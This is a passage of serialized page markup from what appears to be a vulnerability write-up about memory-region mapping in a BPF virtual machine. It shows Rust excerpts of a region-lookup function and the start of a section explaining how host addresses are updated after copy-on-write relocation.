token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c=\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr \"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                        \"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement176\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            index \"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e=\"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index\"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"trailing_zeros\"]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement184\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement187\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement189\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement190\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement194\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index \"]}],[\"$\",\"span\",\"code-segement195\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement196\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement199\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement200\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement202\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement203\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}],[\"$\",\"span\",\"code-segement204\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement205\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"None\"]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement207\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement209\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement210\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement211\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement213\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Safety:\"]}],[\"$\",\"span\",\"code-segement215\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement217\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement218\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// we check for index==0 above, and by construction if we get here index\"]}],[\"$\",\"span\",\"code-segement219\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[24]}],[\"$\",\"span\",\"code-segement221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement222\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// must be contained in region\"]}],[\"$\",\"span\",\"code-segement223\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[25]}],[\"$\",\"span\",\"code-segement225\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement226\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement227\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region \"]}],[\"$\",\"span\",\"code-segement228\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement229\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement230\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement234\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement235\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement236\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"regions\"]}],[\"$\",\"span\",\"code-segement237\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement238\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_unchecked\"]}],[\"$\",\"span\",\"code-segement239\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement240\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index \"]}],[\"$\",\"span\",\"code-segement241\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segement242\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement243\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement244\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement245\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement246\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement247\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement248\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[26]}],[\"$\",\"span\",\"code-segement250\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement251\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement252\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement255\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement256\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement257\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement258\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement259\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[28]}],[\"$\",\"span\",\"code-segement261\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement262\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement263\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement265\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement266\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement267\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[30]}],[\"$\",\"span\",\"code-segement269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement270\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement271\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement273\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement274\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"h2\",\"h2-6\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"The Vulnerability\"}],\"\\n\",[\"$\",\"p\",\"p-96\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"So how are \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion.host_addr\"}],\" updates implemented? The \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"update_caller_account()\"}],\" function needs to detect when account data has been relocated due to CoW operations and update the corresponding memory regions.\"]}],\"\\n\",[\"$\",\"pre\",\"pre-11\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"impl\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"UnalignedMemoryMapping\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        access_type\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        vm_addr\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"dyn\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"error\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// 